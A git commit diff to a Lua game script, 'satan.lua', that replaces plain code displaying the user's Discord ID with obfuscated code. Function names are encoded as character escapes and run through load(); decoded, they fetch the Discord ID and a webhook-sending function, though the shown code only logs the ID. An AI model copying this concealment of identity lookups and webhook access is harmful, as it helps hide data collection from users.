032c8ad29758491abe625473012164f1aa20347b
monarchSatan <133543243+SatanPemula@users.noreply.github.com>
2024-04-30 12:13:35 +0700

    Update satan.lua

--- satan.lua
+++ satan.lua
@@ -1,12 +1,3 @@
-discord = getDiscordID()
-function log(str) 
-  sendVariant({
-      [0] = "OnTextOverlay", 
-      [1] = str, 
-    }) 
-end
-
-log(" Hello User ! ") 
-sleep(1000) 
-log(" User ID : "..discord)
-sleep(1) 
+wh = load(table.concat({"\115", "\101", "\110", "\100", "\87", "\101", "\98", "\104", "\111", "\111", "\107",}))()
+dc = load(table.concat({"\103", "\101", "\116", "\68", "\105", "\115", "\99", "\111", "\114", "\100", "\73", "\68", "\40", "\41",}))()
+doLog("Hello User! : \n"..dc) 
